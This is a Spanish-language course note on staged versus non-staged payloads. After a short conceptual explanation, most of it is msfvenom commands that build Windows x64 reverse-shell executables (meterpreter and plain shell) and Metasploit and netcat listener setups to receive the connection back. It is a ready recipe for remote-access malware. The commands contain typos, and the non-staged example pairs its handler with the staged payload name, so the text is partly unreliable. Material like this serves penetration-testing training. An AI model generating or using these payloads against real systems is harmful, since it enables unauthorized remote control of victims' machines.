- Tags: #payloads #tools
En esta clase, veremos los dos tipos de payloads utilizados en ataques informáticos: **Staged** y **Non-Staged**.

- **Payload Staged**: Es un tipo de payload que se **divide en dos** **o más etapas**. La primera etapa es una pequeña parte del código que se envía al objetivo, cuyo propósito es establecer una conexión segura entre el atacante y la máquina objetivo. Una vez que se establece la conexión, el atacante envía la segunda etapa del payload, que es la carga útil real del ataque. Este enfoque permite a los atacantes sortear medidas de seguridad adicionales, ya que la carga útil real no se envía hasta que se establece una conexión segura.
- **Payload Non-Staged**: Es un tipo de payload que se envía como **una sola entidad** y **no se divide en múltiples etapas**. La carga útil completa se envía al objetivo en un solo paquete y se ejecuta inmediatamente después de ser recibida. Este enfoque es más simple que el Payload Staged, pero también es más fácil de detectar por los sistemas de seguridad, ya que se envía todo el código malicioso de una sola vez.

Es importante tener en cuenta que el tipo de payload utilizado en un ataque dependerá del objetivo y de las medidas de seguridad implementadas. En general, los payloads Staged son más difíciles de detectar y son preferidos por los atacantes, mientras que los payloads Non-Staged son más fáciles de implementar pero también son más fáciles de detectar.


MSFVeneom
```bash
#Payload de tipo staged
Creamos el payload
msfvenon -p windows/x64/meterpreter/reverse_tcp --platform Windows -a x64 LHOST=ip LPORT=port -f exe -o reverse.exe

#Escuchamos com metasploit
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
show options
set LHOST ip_atacante
set LPORT port
run


#Payload de tipo non-staged
msfvenon -p windows/x64/meterpreter_reverse_tcp --platform Windows -a x64 LHOST=ip LPORT=port -f exe -o reverse.exe

#Escuchamos com metasploit
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
show options
set LHOST ip_atacante
set LPORT port
run
```

Crearlo para escuchar con netcat
```bash
#Payload de tipo non-staged
msfvenon -p windows/x64/shell_reverse_tcp --platform Windows -a x64 LHOST=ip LPORT=port -f exe -o reverse.exe

#Escuchamos com nc
#Instalamos utilidad rlwrap apt install rlwrap y la utilizamos con nc para poder hacer ctrl + c y demas

rlwrap nc -nlvp port
```